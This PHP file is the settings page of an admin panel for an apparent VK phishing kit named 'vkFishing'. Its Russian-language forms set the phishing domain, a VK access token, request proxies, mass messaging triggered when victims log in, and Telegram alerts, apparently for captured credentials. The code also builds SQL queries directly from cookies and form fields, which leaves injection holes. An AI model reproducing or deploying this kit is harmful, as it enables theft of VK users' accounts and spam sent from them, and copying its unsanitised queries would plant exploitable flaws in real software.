<?php

	session_start();

	if(isset($_COOKIE['uid']) AND isset($_COOKIE['code']) AND isset($_COOKIE['hash'])) {
		$user = mysql_fetch_assoc(mysql_query("SELECT `id`, `code` FROM `users` WHERE `id` = '".$_COOKIE['uid']."'"));
		$code = md5($user['code']);
		$hash = md5($_SERVER['REMOTE_ADDR'].':'.$user['id']);
		
		if($_COOKIE['uid'] != $user['id'] OR $_COOKIE['code'] != $code OR $_COOKIE['hash'] != $hash) {
			setcookie('uid', NULL, time()-3600*7);
			setcookie('code', NULL, time()-3600*7);
			setcookie('hash', NULL, time()-3600*7);
			header('Location: '.siteURL().'/apanel?act=auth');
		} else {
			$admin = mysql_fetch_assoc(mysql_query("SELECT `login`,`dark_theme`,`preloader` FROM `users` WHERE `id` = '".$_COOKIE['uid']."'"));
			
			if(isset($_POST['update_settings'])) {
				if(isset($_POST['domain']) AND isset($_POST['access_token']) AND isset($_POST['vkapiVersion'])) {
					$domain = trim($_POST['domain']);
					$access_token = trim($_POST['access_token']);
					$vkapiVersion = trim($_POST['vkapiVersion']);
					$proxy = trim($_POST['proxy']);
					$group_id = trim($_POST['group_id']);
					if(!empty($_POST['group_id'])) {
						if(isset($_POST['mailing'])) {
							$mailing = trim($_POST['mailing']);
						} else {
							$mailing = '0';
						}
					} else {
						$mailing = '0';
					}
					
					$query = "UPDATE `config`
							  SET `domain` = '$domain', `access_token` = '$access_token', `vkapiVersion` = '$vkapiVersion', `proxy` = '$proxy', `group_id` = '$group_id', `mailing` = '$mailing'
							 ";
					$res = mysql_query($query) or die (mysql_error());
					
					header('Location: '.siteURL().'/apanel?act=settings');
				}
			}
			
			if(isset($_POST['update_tg_bot'])) {
				if(isset($_POST['tg_bot']) AND isset($_POST['tg_chat_id']) AND isset($_POST['tg_token'])) {
					$tg_bot = trim($_POST['tg_bot']);
					$tg_chat_id = trim($_POST['tg_chat_id']);
					$tg_token = trim($_POST['tg_token']);
					
					$query = "UPDATE `config`
							  SET `tg_bot` = '$tg_bot', `tg_chat_id` = '$tg_chat_id', `tg_token` = '$tg_token'";
					$res = mysql_query($query) or die (mysql_error());
					
					header('Location: '.siteURL().'/apanel?act=settings');
				}				
			}
		}
	} else {
		setcookie('uid', NULL, time()-3600*7);
		setcookie('code', NULL, time()-3600*7);
		setcookie('hash', NULL, time()-3600*7);
		header('Location: '.siteURL().'/apanel?act=auth');
	}
		
?>

<!DOCTYPE html>
<html lang="en">
<head>
	<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
	<title><?php echo $page['title']; ?></title>
	<link href="<?php echo siteURL(); ?>/core/themes/dashboard/css/font-awesome.css" rel="stylesheet">
	<link href="<?php echo siteURL(); ?>/core/themes/dashboard/css/ionicons.css" rel="stylesheet">
	<link href="<?php echo siteURL(); ?>/core/themes/dashboard/css/chartist.css" rel="stylesheet">
	<link href="<?php echo siteURL(); ?>/core/themes/dashboard/css/rickshaw.min.css" rel="stylesheet">
	<link rel="stylesheet" href="<?php echo siteURL(); ?>/core/themes/dashboard/css/dashboard.css">
	<?php if($config['dark_theme'] == True AND $admin['dark_theme'] == True) { echo '<link rel="stylesheet" href="<?php echo siteURL(); ?>/core/themes/dashboard/css/dashboard.css">'; } ?>
</head>
<body>
	<?php if($config['preloader'] == True AND $admin['preloader'] == True) { ?>
	<div id="loading">
		<div id="loading-center">
			<div id="loading-center-absolute">
				<div class="object" id="object_four"></div>
				<div class="object" id="object_three"></div>
				<div class="object" id="object_two"></div>
				<div class="object" id="object_one"></div>
			</div>
		</div>
	</div>
	<?php } ?>
	<div class="slim-header">
		<div class="container">
			<div class="slim-header-left">
				<h2 class="slim-logo"><a href="<?php echo siteURL().'/apanel'; ?>">vkFishing</a></h2>
			</div>
			<div class="slim-header-right">
				<a href="<?php echo siteURL(); ?>/apanel?act=settings" class="header-notification">
					<i class="icon ion-gear-a"></i>
				</a>
				<a href="<?php echo siteURL(); ?>/apanel?act=stats" class="header-notification">
					<i class="icon ion-stats-bars"></i>
				</a>
				<div class="dropdown dropdown-c">
					<a href="#" class="logged-user" data-toggle="dropdown"> <img src="https://vk.com/images/gift/952/512.png" alt=""> <span><?php echo $admin['login']; ?></span> <i class="fa fa-angle-down"></i> </a>
					<div class="dropdown-menu dropdown-menu-right">
						<nav class="nav"><a href="<?php echo siteURL(); ?>/apanel?act=edit" class="nav-link"><i class="icon ion-ios-gear"></i> Настройки</a> <a href="<?php echo siteURL().'/apanel?act=logout&hash='.$_COOKIE['hash']; ?>" class="nav-link"><i class="icon ion-forward"></i> Выход</a> </nav>
					</div>
				</div>
			</div>
		</div>
	</div>
	<div class="slim-mainpanel" style="position: relative;">
		<div class="container">
			<div class="row row-sm mg-t-20">
				<div class="col-lg-6">
					<div class="slim-pageheader">
						<ol class="breadcrumb slim-breadcrumb"></ol>
						<h6 class="slim-pagetitle">Основные настройки</h6>
					</div>
					<div class="card">
						<div class="card-body pd-30">
							<form method="POST">
								<span>Домен сайта</span>
								<div class="form-group">
									<div class="row row-sm">
										<div class="col-sm">
											<input type="text" name="domain" class="form-control" value="<?php echo $config['domain']; ?>" placeholder="Введите домен сайта" required>
										</div>
									</div>
								</div>
								<span>VK ACCESS TOKEN <a href="https://oauth.vk.com/authorize?client_id=3116505&scope=1073737727&redirect_uri=https://api.vk.com/blank.html&display=page&response_type=token&revoke=1" target="_blank">(получить)</a></span>
								<div class="form-group">
									<div class="row row-sm">
										<div class="col-sm">
											<input type="text" name="access_token" class="form-control" value="<?php echo $config['access_token']; ?>" placeholder="Введите VK ACCESS TOKEN" required>
										</div>
									</div>
								</div>
								<span>Актуальная версия VK API</a></span>
								<div class="form-group">
									<div class="row row-sm">
										<div class="col-sm">
											<input type="text" name="vkapiVersion" class="form-control" value="<?php echo $config['vkapiVersion']; ?>" placeholder="Введите актуальную версию VK API" required>
										</div>
									</div>
								</div>
								<span>Прокси</a></span>
								<div class="form-group">
									<div class="row row-sm">
										<div class="col-sm">
											<input type="text" name="proxy" class="form-control" value="<?php echo $config['proxy']; ?>" placeholder="Введите прокси для отправки запросов к VK">
										</div>
									</div>
								</div>
								<span>Рассылка сообщений</a></span>
								<div class="form-group">
									<div class="row row-sm">
										<div class="col-sm">
											<input type="number" name="group_id" class="form-control" value="<?php echo $config['group_id']; ?>" placeholder="ID сообщества (пример: 123456)">
										</div>
										<label class="ckbox ckbox-success mg-t-15">
											<input type="checkbox" name="mailing" <?php if($config['mailing'] == '1') { echo 'value="0" checked'; } else { echo 'value="1"'; } ?>><span>Подключать при авторизации</span>
										</label>
									</div>
								</div>
								<button class="btn btn-primary pd-x-20" type="submit" name="update_settings">Сохранить</button>
							</form>
						</div>
					</div>
				</div>
				<div class="col-lg-6">
					<div class="slim-pageheader">
						<ol class="breadcrumb slim-breadcrumb"></ol>
						<h6 class="slim-pagetitle">Telegram оповещения</h6>
					</div>
					<div class="card">
						<div class="card-body pd-30">
							<form method="POST">
								<span>Состояние оповещений</a></span>
								<div class="form-group">
									<div class="row row-sm">
										<div class="col-sm">
											<select class="form-control select2 select2-hidden-accessible" value="<?php echo $config['tg_bot']; ?>" name="tg_bot" required>
												<option label="Состояние оповещений"></option>
												<option value="1" <?php if($config['tg_bot'] == 1) { echo 'selected'; } ?>>Включены</option>
												<option value="0" <?php if($config['tg_bot'] == 0) { echo 'selected'; } ?>>Выключены</option>
											</select>
										</div>
									</div>
								</div>
								<span>ID чата</span>
								<div class="form-group">
									<div class="row row-sm">
										<div class="col-sm">
											<input type="text" name="tg_chat_id" class="form-control" value="<?php echo $config['tg_chat_id']; ?>" placeholder="Введите ID чата" required>
										</div>
									</div>
								</div>
								<span>Токен бота</span>
								<div class="form-group">
									<div class="row row-sm">
										<div class="col-sm">
											<input type="text" name="tg_token" class="form-control" value="<?php echo $config['tg_token']; ?>" placeholder="Введите токен бота" required>
										</div>
									</div>
								</div>
								<button class="btn btn-primary pd-x-20" type="submit" name="update_tg_bot">Сохранить</button>
							</form>
						</div>
					</div>
				</div>
			</div>
		</div>
	</div>
	<div class="slim-footer">
		<div class="container">
			<p>Copyright 2019 © All Rights Reserved.</p>
			<p>Created with <font color="red">❤</font> by <a href="https://lolzteam.net/aptyp4uk1337" target="_blank">ApTyp4uK1337</a></p>
		</div>
	</div>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/jquery.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/popper.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/bootstrap.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/jquery.cookie.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/chartist.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/d3.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/rickshaw.min.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/jquery.sparkline.min.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/ResizeSensor.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/dashboard.js"></script>
	<script src="<?php echo siteURL(); ?>/core/themes/dashboard/js/slim.js"></script>
	<?php if($config['preloader'] == True AND $admin['preloader'] == True) { ?>
	<script type="text/javascript">
		$(window).load(function() {
			$("#loading").fadeOut(500);
			$("#loading-center").click(function() {
				$("#loading").fadeOut(500);
			})
		})
	</script>
	<?php } ?>
</body>
</html>